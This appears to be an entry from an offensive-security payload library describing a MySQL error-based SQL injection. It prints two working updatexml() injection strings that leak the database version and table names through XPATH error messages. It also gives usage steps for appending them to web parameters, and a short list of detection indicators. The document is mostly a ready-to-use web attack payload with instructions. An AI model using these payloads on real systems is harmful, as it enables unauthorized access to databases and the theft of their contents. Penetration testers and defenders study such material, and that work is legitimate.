---
id: 59829d2c-a934-43a3-9aa9-b9c02ea274ea
name: MySQL-UpdateXML-Basic-Version-and-Table-Extraction
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.472629+00:00'
updated_at: '2023-04-10T20:22:54.890072+00:00'
platforms:
  - MySQL
tags:
  - sql-injection
  - error-based
  - updatexml
  - version-check
validated: true
---

# MySQL-UpdateXML-Basic-Version-and-Table-Extraction

## Code

```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

## Description

This basic SQL payload leverages UpdateXML() to extract the MySQL version and the first table name from the current database, using error messages to leak the information. It serves as an initial probe for confirming vulnerabilities and starting enumeration.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| database() | Current database context (built-in function) | N/A |
| LIMIT 0,1 | Extracts the first result; adjust for more | N/A |

## Usage

Append to injectable strings in web parameters (e.g., 'id=' + payload). The leading single quote closes the string, and '-- -' comments out trailing query parts. Parse the newline-delimited output from XPATH errors to get version and table info. Best for quick vuln confirmation.

## Detection

- Logs of failed XML updates or concat with version()/information_schema.
- HTTP responses with XPATH errors containing database details.
- IDS alerts on SQL keywords like updatexml in payloads.

## Related

- [[procedures/MySQL-Error-Based-Data-Extraction-Using-UpdateXML]]
- [[tools/Burp-Suite]]
